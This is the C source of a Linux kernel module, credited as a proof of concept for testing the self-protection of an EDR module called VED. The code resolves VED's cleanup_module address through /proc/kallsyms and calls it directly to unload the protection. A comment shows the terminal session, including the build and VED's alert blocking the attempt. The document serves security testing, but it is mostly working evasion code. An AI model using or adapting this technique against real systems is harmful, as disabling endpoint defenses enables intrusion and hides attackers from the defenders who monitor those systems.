/*
 * PoC written by MatheuZSecurity
 * https://github.com/MatheuZSecurity/UnhookingLinuxEdr
 *
 * VED's self-protection testing!
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/slab.h>

#define CLEANUP 0xffffffffc0f34340

/*
 *
ved@range:]ls
unhook	ved.ko
ved@range:]insmod ved.ko 
ved@range:]cd unhook/
ved@range:]cat /proc/kallsyms |grep -i ved|grep -i clean
ffffffffc0f3a038 d __UNIQUE_ID___addressable_cleanup_module898	[ved]
ffffffffc0f34340 t cleanup_module	[ved]
ffffffffc0f34330 t __pfx_cleanup_module	[ved]
ved@range:]vim unhook.c 
ved@range:]cat unhook.c|grep -i cleanup
#define CLEANUP 0xffffffffc0f34340
ffffffffc07d2a98 t cleanup_module	[ved]
ved@ved-test:~/unhook$ cat unhook.c|grep -i cleanup
#define CLEANUP 0xffffffffc0c3fa98
        if (strcmp(entry->name, "cleanup_module") == 0) {
    add_entry("cleanup_module", (void *)CLEANUP); //call
        if (strcmp(entry->name, "cleanup_module") == 0) {
    add_entry("cleanup_module", (void *)CLEANUP); //call
ved@range:]make
make -C /lib/modules/6.12.20-0-lts/build/ M=/home/ved/unhook modules
make[1]: Entering directory '/usr/src/linux-headers-6.12.20-0-lts'
  CC [M]  /home/ved/unhook/unhook.o
  MODPOST /home/ved/unhook/Module.symvers
  CC [M]  /home/ved/unhook/unhook.mod.o
  CC [M]  /home/ved/unhook/.module-common.o
  LD [M]  /home/ved/unhook/unhook.ko
make[1]: Leaving directory '/usr/src/linux-headers-6.12.20-0-lts'
ved@range:]insmod unhook.ko 
Killed
ved@range:]dmesg -c
[338388.459573] VED: ALERT: The (1th entry) address 0xffffffffc0eb0133 module: unhook (process name:insmod, pid: 10792) is trying to remove VED!
 *
 */
struct module_entry {
    struct list_head list;
    char *name; 
    void *address;
};

static LIST_HEAD(module_list);

static void add_entry(char *name, void *address) {
    struct module_entry *mod;
    mod = kmalloc(sizeof(struct module_entry), GFP_KERNEL);
    if (!mod) {
        printk(KERN_ERR "Deu ruimkjkj.\n");
        return;
    }
    mod->name = name;
    mod->address = address;
    list_add_tail(&mod->list, &module_list);
}

static void magick_lol(void) {
    struct module_entry *entry;
    list_for_each_entry(entry, &module_list, list) {
        if (strcmp(entry->name, "cleanup_module") == 0) {

            ((void (*)(void))entry->address)();
            break;
        }
    }
}

static int __init lkm_init(void) {
    add_entry("cleanup_module", (void *)CLEANUP); //call
    magick_lol();

    return 0;
}

static void __exit lkm_exit(void) {
  printk(KERN_INFO "Qlq coisa kkjkjkjk\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuz");
MODULE_DESCRIPTION("Sem descrição kkjkjk");
MODULE_VERSION("1.0");

module_init(lkm_init);
module_exit(lkm_exit);
